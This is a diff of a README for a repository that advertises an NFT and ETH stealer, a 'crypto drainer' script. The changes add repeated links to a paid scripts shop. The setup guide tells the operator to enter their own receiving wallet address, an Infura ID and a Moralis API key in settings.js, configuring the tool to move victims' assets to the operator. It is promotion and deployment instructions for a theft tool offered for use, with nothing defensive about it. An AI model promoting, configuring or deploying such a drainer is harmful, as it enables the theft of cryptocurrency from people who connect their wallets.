@@ -1,10 +1,8 @@
-- Scripts Shop: https://crypto-hack.sellix.io/
-
-
 # *⛔ Beware of scams, this is the real repo*
 
-
-## 🖼️ NFT Stealer / ETH Stealer / Drainer Template
+>>>  Scripts Shop: https://crypto-hack.sellix.io/
+>>>  
+## 🖼️ NFT Stealer / ETH Stealer / Crypto Drainer Script
 
 ![preview](https://cdn.discordapp.com/attachments/954051921709252641/971157628694700032/unknown.png)
 
@@ -19,7 +17,7 @@
 
 
 ## `✏️ Setup Guide:` 
-you need to edit the **settings.js** file. 
+you need to edit the **settings.js** file.  >>>  Scripts Shop: https://crypto-hack.sellix.io/
 - line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
 - line 2: const infuraId = `"APP ID";` replace **APP ID with your Infura ID**
 - line 3: const moralisApi = `"X-API-KEY";` replace **X-API-KEY with your Moralis web3 api key**
